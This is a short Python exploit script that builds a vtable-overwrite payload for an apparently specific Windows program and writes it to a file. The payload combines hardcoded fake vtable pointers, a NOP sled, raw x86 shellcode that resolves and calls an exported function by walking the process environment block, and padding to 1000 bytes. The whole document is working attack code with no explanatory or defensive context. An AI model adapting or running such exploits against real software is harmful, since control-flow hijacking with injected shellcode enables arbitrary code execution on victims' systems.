import struct 
def p32(a):
        return struct.pack('<L',a)
shell  = (
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
"\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7"
)

NOP = '\x90'*100

VTABLE = p32(0x403048)
VFUNC1 = p32(0x40304c)
VFUNC2 = p32(0x403050)
junk = "A"*(1000-len(VFUNC1+VFUNC2+NOP+shell))
payload = VFUNC1+VFUNC2+NOP+shell+junk+VTABLE
'''
payload += VFUNC1 
payload += VFUNC2 
payload+= NOP 
payload+= shell
payload += junk 
payload+= VTABLE
'''
f = open("exploit.txt","w")
f.write(payload)
f.close()